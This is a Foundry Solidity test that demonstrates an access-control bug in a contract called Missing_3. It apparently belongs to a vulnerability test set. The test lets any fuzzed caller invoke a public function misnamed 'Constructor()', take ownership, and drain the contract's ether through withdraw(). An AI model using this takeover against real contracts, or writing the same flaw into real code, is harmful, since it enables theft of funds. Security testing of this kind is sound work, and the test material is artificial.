
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {Missing_3} from "../src/Missing_3.sol";

contract TestAccessControlMissing_3 is Test {
    Missing_3 private target;
    address private deployer;

    function setUp() public {
        deployer = address(0xDEAD);
        vm.prank(deployer);
        target = new Missing_3();
    }

    function test_highlightArbitraryUserCanAccess(address caller) public {
        // --- 1. Constraints ---
        // Caller cannot be the test contract itself.
        vm.assume(caller != address(this));
        // Exclude the Zero Address
        vm.assume(caller != address(0));
        // Exclude Foundry Internals
        vm.assume(caller != address(vm));
        // Exclude the Console address
        vm.assume(caller != 0x000000000000000000636F6e736F6c652e6c6f67);
        // Exclude the deployer (who deployed the contract but is NOT the owner due to the bug)
        vm.assume(caller != deployer);

        // --- 2. State Configuration ---
        // Fund the contract so withdraw has something to transfer
        vm.deal(address(target), 1 ether);
        
        // Record caller's balance before the attack
        uint256 callerBalanceBefore = caller.balance;

        // --- 3. Execution & Assertion ---
        
        // The vulnerability: Constructor() is a regular public function, not a real constructor.
        // Any arbitrary caller can call Constructor() to become the owner.
        vm.prank(caller);
        target.Constructor();
        
        // Now the caller is the owner, they can withdraw all funds
        vm.prank(caller);
        target.withdraw();
        
        // Assert that the caller successfully drained the contract
        assertEq(address(target).balance, 0, "Contract should be drained");
        assertEq(caller.balance, callerBalanceBefore + 1 ether, "Caller should have received the funds");
    }
}
